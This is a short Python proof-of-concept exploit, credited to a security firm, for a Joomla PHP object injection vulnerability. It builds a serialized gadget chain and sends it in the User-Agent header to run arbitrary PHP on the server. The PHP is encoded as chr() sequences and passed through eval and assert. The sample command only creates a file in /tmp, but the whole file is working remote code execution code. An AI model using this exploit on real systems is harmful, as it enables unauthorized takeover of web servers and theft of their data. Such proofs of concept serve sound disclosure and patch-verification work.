   Simple PoC for Joomla Object Injection.
   Gary @ Sec-1 ltd
   http://www.sec-1.com/
&#039;&#039;&#039;
  
import requests #  easy_install requests
  
def get_url(url, user_agent):
  
    headers = {
    &#039;User-Agent&#039;: user_agent
    }
    cookies = requests.get(url,headers=headers).cookies
    for _ in range(3):
        response = requests.get(url, headers=headers,cookies=cookies)    
    return response
    
def php_str_noquotes(data):
    "Convert string to chr(xx).chr(xx) for use in php"
    encoded = ""
    for char in data:
        encoded += "chr({0}).".format(ord(char))
  
    return encoded[:-1]
  
  
def generate_payload(php_payload):
  
    php_payload = "eval({0})".format(php_str_noquotes(php_payload))
  
    terminate = &#039;\xf0\xfd\xfd\xfd&#039;;
    exploit_template = r&#039;&#039;&#039;}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";&#039;&#039;&#039;
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)    
    exploit_template += r&#039;&#039;&#039;s:{0}:"{1}"&#039;&#039;&#039;.format(str(len(injected_payload)), injected_payload)
    exploit_template += r&#039;&#039;&#039;;s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}&#039;&#039;&#039; + terminate
  
    return exploit_template
  
  
  
pl = generate_payload("system(&#039;touch /tmp/fx&#039;);")
  
print get_url("http://172.31.6.242/", pl)

